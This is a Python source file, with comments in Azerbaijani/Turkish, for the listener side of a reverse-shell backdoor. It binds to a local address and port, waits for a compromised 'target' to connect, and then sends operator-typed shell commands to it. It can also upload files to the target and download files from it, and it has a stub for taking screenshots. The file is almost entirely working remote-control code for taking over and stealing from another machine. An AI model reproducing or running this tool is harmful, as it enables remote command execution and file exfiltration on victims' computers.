import socket
import json
import os
import pyscreenshot
from PIL import Image

def reliable_send(data):
	jsondata = json.dumps(data)#data adli bir verini json a donusturur(data dict veya list ola biler) metine donusturur
	target.send(jsondata.encode())#target adli sokete jsondata adli veriyi gonderir ve encode (utf-8) ile byte ceviririk ki internet uzerinde paylasila bilsin

def reliable_recv():
	data = '' #alinan verileri depolamak ucun
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()#target adli soketten 1024 baytlig veri alib utf-8 formatina cevirib data ya elave edir ve rstrip ile alinan verinin sonundaki bosluqlari qaldirir
			return json.loads(data)# datani json formatina cevirib dondurur
		except ValueError:# eger json dondurmezse ValueError vererse
			continue#dongunun baslangicina geder ve data almaga davam eder


def upload_file(file_name):
        f = open(file_name, 'rb')#rb ile baytlari oxuyurug
        target.send(f.read())#bayt dizisi oxunur ve targete gonderilir


def download_file(file_name):
	f = open(file_name, 'wb')#alinan verini basqa bir dosyaya yazmaq ucun wb ile aciriq
	target.settimeout(1)#1 saniye icinde veri alinmazsa dongu biter socket timout xetasi verer
	chunk = target.recv(1024)#soketten 4096 baytliq veri parcasi alir acilan dosyanin bir bolumu
	while chunk:
		f.write(chunk)#alinan verini chunk dosyasina yaziriq
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:#socket timout xetasi alarsa dongu durmasi ucun
			break
	target.settimeout(None)#target soketinin timeoutunu bagliyar ve diger soketler normal isleyer
	f.close()#dosyani bagliyar


def target_communication():
	while True:
		command = input('* Shell~%s: ' % str(ip))#serverden bir command isteyirik
		reliable_send(command)#reliable_send ile command hedefe gonderirlir hedefte bu commandi alir ver calistirir
		if command == 'quit':
			break
		elif command == 'clear':
			os.system('clear')
		elif command == 'screenshot':
			pass
		elif command[:3] == 'cd ':
			pass
		elif command[:8] == 'download':
			download_file(command[9:])
		elif command[:6] == 'upload':
			upload_file(command[7:])
		else:
			result = reliable_recv()
			print(result)


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)#soketi istifade ederek yeni bir soket nesnesi yaratdim
sock.bind(('192.168.100.224', 6060))#baglanti adresini verdik 
print('[+] Listening For The Incoming Connections')
sock.listen(5) #dinlemeye basladiq ve eyni vaxti 5 baglanti acmasini ayarladiq
target, ip = sock.accept() # gelen baglantini qebul edir (target qebul olunan baglantini temsil edir, ip de baglanan adamin ip adresidir)
print('[+] Target Connected From: ' + str(ip))
target_communication()
